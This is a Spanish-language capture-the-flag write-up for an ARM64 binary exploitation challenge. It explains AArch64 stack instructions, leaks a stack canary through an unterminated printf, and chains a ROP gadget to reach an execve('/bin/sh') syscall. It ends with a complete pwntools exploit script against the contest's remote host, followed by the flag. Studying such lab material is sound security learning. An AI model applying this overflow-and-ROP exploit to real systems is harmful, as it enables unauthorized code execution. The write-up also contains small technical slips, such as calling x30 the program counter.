# ARM World

La descripcion de reto dejaba en claro que era hacer ROP en ARM.

Fue la primera vez que intentaba esto en otra arquitectura viniendo de un trasfondo de x86.

## Teoria

En arquitecturas i386, x86_84 se usa `rsp` como puntero de pila y `rip` como puntero de instruccion; y `ret` es equivalente a `pop rip`.

En arm es un poco diferente. Se utiliza `sp` como puntero de pila y `x30` (tambien llamado `pc`) como puntero de instruccion, y su ret en realidad es un `br x30` ("branch register x30").

El registro equivalente a `rbp` es `x29`. En algunos desensambladores/decompiladores se muestran las variables locales relativas a este registro.

Para leer de la pila se usan las instrucciones `ldr`("load register") y `ldp` ("load pair"). Para escribir en la pila se usan `str`("store register") y `stp`("store pair").

Todos tienen diferentes notaciones, por ejemplo:
```
ldr x30,[sp]                  # x30 = *sp
ldr x30,[sp,#0x20]            # x30 = *(sp+0x20)  (notacion infija)
ldr x30,[sp], #0x30           # x30 = *sp; sp = sp + 0x30 (notacion postfija)
```

`ldp` y `stp` son iguales a los anteriores solo que permiten hacer las operaciones con dos registros a la vez:
```
ldp x29,x30,[sp, #0x50]        # x29 = *(sp + 0x50); 30 = *(sp + 0x58)
stp x29,x30,[sp, #local_20]    # sp + 0x20 = x29; sp + 0x28 = x30
```

Por lo que pude observar x30 es almacenado en la pila durante el preambulo de la funcion y recuperado en el epilogo asi que es bastante similar a lo que estaba acostumbrado.

## Filtrando el canario

Normalmente uso checksec para revisar las protecciones del binario pero este falló al no detectar el canario:
```
./chal
Welcome to ARM World!
Write your name: bob
Your name: bob

Write your Guestbook: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you Guestbook!
*** stack smashing detected ***: terminated
qemu: uncaught target signal 6 (Aborted) - core dumped
zsh: IOT instruction  ./chal
```

Podemos filtrar el canario durante nuestra primera lectura si pasamos 64 caracteres no nulos:
```
./chal | xxd
00000000: 5765 6c63 6f6d 6520 746f 2041 524d 2057  Welcome to ARM W
00000010: 6f72 6c64 210a 5772 6974 6520 796f 7572  orld!.Write your
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
00000020: 206e 616d 653a 2059 6f75 7220 6e61 6d65   name: Your name
00000030: 3a20 4141 4141 4141 4141 4141 4141 4141  : AAAAAAAAAAAAAA
00000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000050: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000060: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000070: 4141 0a8c 1c20 3650 669e f0dc 9f89 fc7e  AA... 6Pf......~
00000080: 0a57 7269 7465 2079 6f75 7220 4775 6573  .Write your Gues
```

El canario es `0x8c1c203650669e00`.

Empecemos explicando que el stack frame luce asi:
```
+----------------------------------------+
| 0xdeadbeefcafebabe          sp         |
| junk                        sp + 0x10  |
| x29                         sp + 0x18  |
| x30                         sp + 0x20  |
| stack_canary                sp + 0x28  |
| var_38                      sp + 0x38  |                   
| buffer2                     sp + 0x48  |
| var_58                      sp + 0x58  |
| buffer1                     sp + 0x68  |
+----------------------------------------+
```

Esto ocurre porque el buffer usado en la primera lectura se encuentra a 0x40 bytes del canario y `printf("Your name: %s\n",&buffer);` lee el string hasta encontrar un byte nulo.

Entonces como el canario son 7 bytes aleatorios y 1 byte nulo (el mas significativo, recordar que estamos en little endian por eso se encuentra al final) termina leyendolos.

El segundo buffer se encuentra a 0x20(32) bytes del canario.

```py

# ** Leak stack canary **
r.recvuntil(b"name: ")
r.sendline(b"A"*64)
r.recvuntil(b"A"*64)
sc = r.recv(8)
sc = b"\x00" + sc[1:]
log.success(f"Stack canary leaked: {hex(u64(sc))}")

# ** Buffer overflow **
r.recvuntil(b"book: ")
payload = b"A"*32                  # offset
payload += sc                      # stack canary
payload += p64(0)                  # x29
payload += p64(gadget)             # x30
```

## Syscall

Antes de pasar a crear nuestra ROP-chain debemos encontrar una via de ganar una shell.

El binario esta estaticamente enlazado asi que no podemos hacer un ret2libc o algo por el estilo.

Buscando la cadena "/bin/sh" encontramos una funcion que invoca a otra que hace esto tomando como parametro la misma:

<img width="867" height="209" alt="2025-07-30-142453_867x209_scrot" src="https://github.com/user-attachments/assets/714a5d73-d206-4a1c-84e7-c6886f444b5f" />

Esto es una syscall!

En ARM64 el numero de syscall se especifica en `x8` y los argumentos se pasan via `x0-x5`

En nuestro caso es 0xdd(221), que coincide con `execve`:

<img width="1361" height="613" alt="2025-07-30-163515_1361x613_scrot" src="https://github.com/user-attachments/assets/78e3c26b-cfa7-450b-ad0d-955241e0ce5d" />
Referencia:https://arm64.syscall.sh

## ROP

Debemos conseguir llamar a la syscall con un parametro que apunte a `/bin/sh\x00`.

Para encontrar los gadgets podemos usar **ropper** o **ROPgadget**.

En arm es mas dificil encontrar gagets utiles porque debe contener algo como `ldp x29,x30, [sp]` o sus variantes con notacion infija y posfija para poder concatenarlos.

Usando ropper me llamó la atención este en particular:
```
 # 0x0000000000425ef0: mov x0, x19; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;
```

Este gadget mueve el contenido de `x19` a `x0`, y luego copia el contenido de `sp + 0x10` en `x19`.

Si las operaciones estuviesen invertidas fuese perfecto pero como no lo estan opté por llamarlo dos veces, la primera para ajustar la direccion de `/bin/sh\x00` en `x19` y la segunda para copiarla en `x0`.

*Nota: Habia un gadget que lo resolvia en 1 paso pero este fue  el primero que encontré.*

#### Exploit final

``` py
#!/usr/bin/env python3

from pwn import *

elf = ELF("./chal")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
context.arch = 'aarch64'
context.bits = 64
context.endian = 'little'
gs = '''
break *0x0000000000425ef0
'''
domain= "chal.wwctf.com"
port = 32873
def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================
gadget = 0x0000000000425ef0  # 0x0000000000425ef0: mov x0, x19; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;
execve_syscall = 0x000000000044c35c

# ** Leak stack canary **
r.recvuntil(b"name: ")
r.sendline(b"A"*64)
r.recvuntil(b"A"*64)
sc = r.recv(8)
sc = b"\x00" + sc[1:]
log.success(f"Stack canary leaked: {hex(u64(sc))}")

# ** Buffer overflow **
r.recvuntil(b"book: ")
payload = b"A"*32                  # offset
payload += sc                      # stack canary
payload += p64(0)                  # x29
payload += p64(gadget)             # x30

# store "/bin/sh\x00" address in x19
payload += p64(0) * 2                                # junk (stack alignment)     **
payload += p64(0)                                    # x29                        **
payload += p64(0x0000000000425ef0)                   # x30                        **
payload += p64(next(elf.search(b"/bin/sh\x00")))     # x19                        **
payload += p64(0)                                    # x20                       : **

bin_sh = next(elf.search(b"/bin/sh\x00"))


# 0x0000000000425ef0: mov x0, x19; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;
# store "/bin/sh\x00" address in x0
payload += p64(0)                                    # x29        **
payload += p64(0x000000000044c35c)                   # x30        **
payload += p64(next(elf.search(b"/bin/sh\x00")))     # x19        **
payload += p64(0)                                    # x20        **
payload += b"A"* 16                                  # junk       **

r.sendline(payload)

r.interactive()
```

`wwf{w0W_y0u_5uCc35s_aRM_rOp!!}`
